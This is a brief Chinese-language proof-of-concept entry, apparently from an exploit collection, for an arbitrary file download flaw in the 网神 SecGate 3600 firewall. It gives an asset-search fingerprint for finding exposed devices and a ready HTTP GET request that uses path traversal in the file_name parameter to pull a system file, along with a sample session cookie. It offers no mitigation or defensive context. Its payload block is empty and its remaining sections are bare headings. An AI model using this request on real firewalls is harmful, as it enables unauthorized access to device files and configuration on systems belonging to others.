# 网神SecGata3600防火墙存在任意文件下载漏洞

- **系统**：网神SecGata3600防火墙　|　**类型**：其他　|　**CVE**：—
- **指纹**：`app.name="网神 SecGate"`
- **请求**：`GET /?g=sys_export_conf_local_save&file_name=../modules/system/import_export.mds HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: __s_sessionid__=5543sd9rcbiklqs1ttignkqvt6`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```

```

**其他**
- 网神SecGata 3600防火墙存在任意文件下载漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 网神SecGata 3600防火墙